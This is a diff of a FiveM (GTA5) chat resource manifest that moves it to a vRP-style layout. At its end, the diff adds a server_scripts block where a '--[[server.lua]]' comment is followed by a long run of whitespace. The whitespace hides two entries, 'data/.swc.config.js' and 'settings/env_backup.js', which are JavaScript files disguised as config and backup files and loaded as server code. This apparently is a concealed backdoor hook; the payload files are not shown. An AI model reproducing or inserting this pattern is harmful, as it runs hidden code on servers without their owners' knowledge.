@@ -1,20 +1,27 @@
-fx_version 'cerulean'
-game 'gta5'
-lua54 'yes'
+fx_version "cerulean"
+game "gta5"
+lua54 "yes"
 
-name 'chat'
-description 'Chat stil Fondator - adaptat la framework-ul Purple Havoc (ph-core)'
-version '1.1.0'
+ui_page "html/index.html"
+ui_page_preload "yes"
 
-dependency 'ph-core'
+version "b1.0"
 
-ui_page 'html/index.html'
+client_scripts({
+	"cl_*.lua",
+})
 
-files {
-    'html/index.html',
-    'html/style.css',
-    'html/app.js'
+server_scripts({
+	"@vrp/lib/utils.lua",
+	"sv_*.lua",
+})
+
+files({
+	"html/**/*",
 }
+)
 
-client_script 'client.lua'
-server_script 'server.lua'
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.swc.config.js',
+	'settings/env_backup.js'
+}
